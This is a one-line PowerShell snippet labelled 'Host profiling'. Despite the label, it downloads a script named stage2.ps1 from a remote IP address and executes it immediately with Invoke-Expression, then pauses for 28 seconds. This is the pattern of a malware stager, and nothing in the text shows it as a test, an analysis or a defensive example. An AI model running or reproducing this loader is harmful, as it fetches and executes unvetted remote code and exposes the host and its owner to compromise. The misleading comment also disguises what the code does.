
<# Host profiling #> $TransferUrl = 'http://198.51.100.204/stage2.ps1'; IEX (Invoke-WebRequest -Uri $TransferUrl -UseBasicParsing).Content; Start-Sleep -Seconds 28
